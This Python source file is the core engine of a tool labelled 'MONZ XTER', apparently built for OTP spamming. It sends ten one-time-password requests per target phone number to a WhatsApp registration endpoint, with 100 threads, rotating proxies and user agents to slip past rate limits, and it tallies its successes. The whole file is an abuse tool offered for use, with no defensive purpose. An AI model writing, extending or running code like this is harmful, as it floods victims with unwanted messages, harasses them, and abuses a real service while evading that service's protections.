#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MONZ XTER MAIN ENGINE - CORE SPAMMING LOGIC
"""

import requests
import time
import random
import threading
import json
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
from handlers import SpamHandler
from useragents import UAManager
from utilitas import ProxyManager, Logger

init(autoreset=True)

class MainEngine:
    def __init__(self):
        self.config = self.load_config()
        self.handler = SpamHandler(self.config)
        self.ua_manager = UAManager()
        self.proxy_manager = ProxyManager()
        self.logger = Logger("logs/activity.log")
        self.results = {"success": 0, "failed": 0, "total": 0}
        self.lock = threading.Lock()
    
    def load_config(self):
        default = {
            "endpoint": "https://web.whatsapp.com/app/register",
            "threads": 100,
            "delay": 0.2,
            "retry": 5,
            "timeout": 5,
            "proxy_enabled": True,
            "proxy_file": "data/proxies.txt",
            "ua_enabled": True,
            "ua_file": "data/useragents.txt"
        }
        if os.path.exists("config.json"):
            with open("config.json", "r") as f:
                return json.load(f)
        return default
    
    def run(self, targets):
        print(Fore.YELLOW + "\n[🚀] STARTING SPAM ENGINE...")
        print(Fore.WHITE + "="*60)
        print(Fore.CYAN + f"Targets: {len(targets)}")
        print(Fore.CYAN + f"Threads: {self.config['threads']}")
        print(Fore.CYAN + f"Delay: {self.config['delay']}s")
        print(Fore.CYAN + f"Retry: {self.config['retry']}")
        print(Fore.WHITE + "="*60 + "\n")
        
        self.logger.info(f"Starting spam on {len(targets)} targets")
        
        total_requests = len(targets) * 10  # 10 spam per target
        
        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = []
            for target in targets:
                for i in range(10):
                    future = executor.submit(
                        self.handler.send_otp,
                        target,
                        self.config['endpoint'],
                        self.config['retry'],
                        self.config['timeout']
                    )
                    futures.append(future)
                    time.sleep(random.uniform(0.1, self.config['delay']))
            
            # Collect results
            for future in futures:
                result = future.result()
                with self.lock:
                    if result:
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                    self.results["total"] += 1
        
        print(Fore.WHITE + "\n" + "="*60)
        print(Fore.GREEN + "[✓] SPAM COMPLETED!")
        print(Fore.CYAN + f"Success: {self.results['success']}")
        print(Fore.RED + f"Failed: {self.results['failed']}")
        print(Fore.YELLOW + f"Total: {self.results['total']}")
        print(Fore.WHITE + "="*60)
        
        self.logger.info(f"Spam completed: {self.results['success']} success, {self.results['failed']} failed")
    
    def show_config(self):
        print(json.dumps(self.config, indent=4))
    
    def show_proxies(self):
        proxies = self.proxy_manager.load()
        if proxies:
            print(Fore.GREEN + f"[✓] Loaded {len(proxies)} proxies:")
            for p in proxies[:10]:
                print(f"  • {p}")
            if len(proxies) > 10:
                print(Fore.YELLOW + f"  ... and {len(proxies)-10} more")
        else:
            print(Fore.RED + "[✗] No proxies loaded")
    
    def show_logs(self):
        self.logger.show_last(20)